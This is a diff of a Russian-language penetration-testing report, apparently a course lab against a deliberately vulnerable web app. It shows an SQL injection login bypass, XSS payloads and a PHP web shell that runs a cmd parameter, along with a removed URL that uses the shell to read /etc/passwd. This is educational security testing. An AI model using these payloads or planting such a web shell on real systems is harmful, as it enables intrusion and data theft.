@@ -773,67 +773,32 @@ sudo docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-ful
 - Реализовать CSRF защиту
 - Настроить все необходимые заголовки безопасности
 
-## Этап 3 - тестирование
 
-### Тестирование веб-приложения NetologyVulnApp (92.51.39.106:8050)
 
-#### Эксплуатация SQL Injection в форме авторизации.
-- Страница входа http://92.51.39.106:8050/users/login.php
+## Этап 3. Тестирование
+
+### Тестирование по порту 8050:
+
+#### Эксплуатация SQL инъекции в форме логина
+
 ```
+http://92.51.39.106:8050/users/login.php
 Username > admin' or '1'='1'#
-Password > 1111
-(пароль любой)
+Password > 123
 ```
 
-Результат:
-![SQL Injection](./img/test_sql_in_01.jpg)
-![SQL Injection](./img/test_sql_in_02.jpg)
+Итоги на скриншотах:
 
+![Ввод логина и пароля](./img/test_8050_01.jpg)
 
+![Результат](./img/test_8050_02.jpg)
 
-#### Тестирование уязвимостей Cross-Site Scripting (XSS).
+#### Создание и загрузка Web shell (RCE)
 
-####DOM-based XSS в гостевой книге:
-- Страница входа http://92.51.39.106:8050/guestbook.php
-- В поле комментария вводим:
 ```
-<script>alert('XSS DOM-Based')</script>
-````
-
-Результат:
-![XSS DOM-Based](./img/test_comm_01.jpg)
-![XSS DOM-Based](./img/test_comm_02.jpg)
-
-
-
-#### Reflected XSS в форме поиска:
-- Любая страница, строка поиска http://92.51.39.106:8050/
-- В поле поиска вводим код
-```
-<a href="#" onclick="alert('XSS Reflected')">Netology</a>
+shell.php
 ```
 
-Результат:
-![XSS Reflected](./img/test_search_01.jpg)
-![XSS Reflected](./img/test_search_02.jpg)
-![XSS Reflected](./img/test_search_03.jpg)
-
-
-#### Stored (Persistent) XSS в комментариях к фото:
-- Страница просмотра первого изображения http://92.51.39.106:8050/pictures/view.php?picid=15
-- В форму комментария вводим
-```
-<script>alert('Stored XSS')</script>
-```
-
-Результат:
-![Stored XSS](./img/test_com_img_01.jpg)
-![Stored XSS](./img/test_com_img_02.jpg)
-
-
-#### Проверка уязвимости File Inclusion через загрузку веб-шелла.
-- Страница http://92.51.39.106:8050/pictures/upload.php
-- Загружаем подготовленный файл shell.php с кодом:
 ```
 <?php
 if (isset($_REQUEST['cmd'])) {
@@ -842,41 +807,4 @@ if (isset($_REQUEST['cmd'])) {
 ?>
 ```
 
-Проверяем результат:
-```
-http://92.51.39.106:8050/upload/111/shell.php?cmd=cat+/etc/passwd
-```
 
-Результат:
-![File Inclusion](./img/test_shell_01.jpg)
-![File Inclusion](./img/test_shell_02.jpg)
-![File Inclusion](./img/test_shell_03.jpg)
-![File Inclusion](./img/test_shell_04.jpg)
-![File Inclusion](./img/test_shell_05.jpg)
-![File Inclusion](./img/test_shell_06.jpg)
-
-
-
-
-
-
-* Ожидаемый результат: После отправки комментария в браузере должно появиться всплывающее окно с текстом предупреждения.
-* 2.2.2. Reflected XSS в форме поиска:
-* Место: Главная страница, строка поиска.
-* Payload: Ввести HTML-код, создающий ссылку с обработчиком события: <a href="#" onclick="alert('XSS Reflected')">Click me</a>.
-* Ожидаемый результат: На странице результатов поиска отобразится ссылка, при нажатии на которую сработает alert.
-* 2.2.3. Stored (Persistent) XSS в комментариях к фото:
-* Место: Страница просмотра изображения, например /pictures/view.php?picid=15.
-* Payload: В форму комментария ввести <script>alert('Stored XSS')</script>.
-* Ожидаемый результат: Скрипт сохранится на сервере и будет выполняться у всех пользователей, открывающих эту страницу.
-
-2.3. Проверка уязвимости File Inclusion через загрузку веб-шелла.
-* Действие: Воспользоваться формой загрузки файлов на /pictures/upload.php.
-* Создание payload:
-* Создать файл shell.php с кодом, выполняющим системные команды (например, с использованием shell_exec и HTML-формы для ввода).
-* Эксплуатация:
-* Загрузить shell.php на сервер.
-* Найти путь к загруженному файлу через интерфейс приложения (например, в /upload/PHP/).
-* Перейти по прямой ссылке на файл и убедиться в его исполнении.
-* Ввести команду cat /etc/passwd в форму шелла и получить содержимое системного файла.
-* Доказательство: Скриншоты успешной загрузки файла, интерфейса веб-шелла и результата выполнения команды.
